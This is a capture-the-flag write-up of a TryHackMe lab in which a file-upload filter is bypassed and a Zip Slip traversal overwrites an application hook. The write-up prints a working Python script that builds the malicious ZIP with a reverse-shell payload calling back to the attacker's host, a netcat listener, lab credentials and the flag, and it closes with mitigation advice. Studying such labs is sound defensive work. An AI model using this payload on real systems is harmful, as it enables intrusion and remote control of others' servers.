---
layout: default
title: Day 10 - The Hollow Shell
---

- [./ctf-writeups](../../../../) / [TryHackMe](../../../) / [Events](../../) / [Byte Lotus Hotel](../) / [Day 9 - CryptoCabana](../9_CryptoCabana)

# Day 10 - The Hollow Shell

**Difficulty:** Medium  
**Category:** Web exploitation / Zip Slip / Remote Code Execution

**Summary:** This room focuses on exploiting a file upload feature vulnerable to "Zip Slip". After finding leaked credentials in the HTML source code, we bypass the application's file type validation by sneaking a Python script into a ZIP archive. We then weaponize this behavior by crafting a malicious ZIP file containing directory traversal paths, allowing us to overwrite a system hook with a reverse shell payload and achieve Remote Code Execution.

## 1. Reconnaissance and web enumeration

We started our standard enumeration with an `nmap` scan against the target:

```
nmap -sC -sV 10.112.160.92
```

The scan revealed a web server running on port 5000, powered by Gunicorn. Navigating to `http://10.112.160.92:5000` in the browser, we inspected the page's HTML source code. In the comments left by the developers, we found a hardcoded set of credentials: `concierge` / `StayNoticed2024!`.

## 2. Vulnerability discovery (file upload filter bypass)

Using the discovered credentials, we logged in and found an upload feature that accepts ZIP archives containing "shells". The application expects a `shell.json` file defining the assets and the assets themselves.

We performed a series of tests to understand the upload validation mechanism:

**Test 1: Normal upload**
We created a fake PNG file using magic bytes and bundled it with a valid JSON file.

```
printf '\x89PNG\r\n\x1a\n' > userr.png
echo '{"name":"test","assets":["userr.png"]}' > shell.json
zip shell.zip shell.json userr.png
```

Uploading `shell.zip` succeeded, and the PNG was accessible at `/shells/99626ebd60e0/userr.png`.

**Test 2: Blacklisted extension**
We tried to upload a Python script (`test.py`) and declared it in the `shell.json`. 
The application rejected it with the error: `"Shell rejected: asset type not allowed: test.py"`.

**Test 3: Filter bypass**
We packaged the Python script inside the ZIP, but this time, we only declared the PNG file in the `shell.json`.

```
echo '{"name":"test2","assets":["userr.png"]}' > shell.json
zip test2.zip shell.json userr.png test.py
```

The upload was successful! Even better, accessing `/shells/.../test.py` executed or displayed our Python file. This proved that the backend extracts all files from the ZIP but only validates the files explicitly mentioned in the JSON file.

## 3. Exploitation (Zip slip to RCE)

Knowing the backend insecurely extracts archive contents, we hypothesized it might be vulnerable to **Zip Slip** (a widespread directory traversal vulnerability occurring when extracting ZIP archives).

If we name a file `../../hooks/evil.py` inside the ZIP, the vulnerable extraction code might place our payload outside the intended `/shells/` directory and overwrite an application hook that gets executed automatically.

We wrote a Python script (`exploit.py`) to programmatically craft this malicious ZIP archive:

```python
import zipfile, json

payload = ('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.112.70.31",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")')

with zipfile.ZipFile("evil.zip", "w") as z:
        z.writestr("shell.json", json.dumps({"name": "evil", "assets": ["userr.png"]}))
        z.writestr("userr.png", b"\x89PNG\r\n\x1a\n")
        z.writestr("../../hooks/evil.py", payload)
```

We generated `evil.zip` and set up a Netcat listener on our local machine:

```
nc -lvnp 4444
```

Upon uploading `evil.zip`, the application extracted the files, traversed the directories, and overwrote the hook. Instantly, our Netcat listener caught the reverse shell connection as the `roomservice` user. We navigated to the home directory and retrieved the flag.

**Flag:**
<span class="spoiler" role="button" tabindex="0" aria-label="Hidden flag">THM{z1p_sl1pp3d_1nt0_a_sh3ll}</span>

## 4. Mitigation (how to fix it)

To prevent Zip Slip and insecure file uploads, developers must implement the following safeguards:

+ **Validate extraction paths:** Before writing an extracted file to disk, the application must resolve the absolute path and verify that it starts strictly with the intended target directory. Any paths resolving outside this directory (using `../`) must be rejected.
+ **Sanitize archive contents:** Do not rely on a user-provided JSON file to validate what is inside an archive. The backend must iterate through the ZIP headers directly and check the extensions and names of all included files.
+ **Apply least privilege:** The web application process (`roomservice`) should only have write access to the specific upload directory. It should absolutely not have permissions to overwrite application source code or executable hooks in parent directories.

<br>
- [Day 11 - Infinity Pool](../11_Infinity_Pool)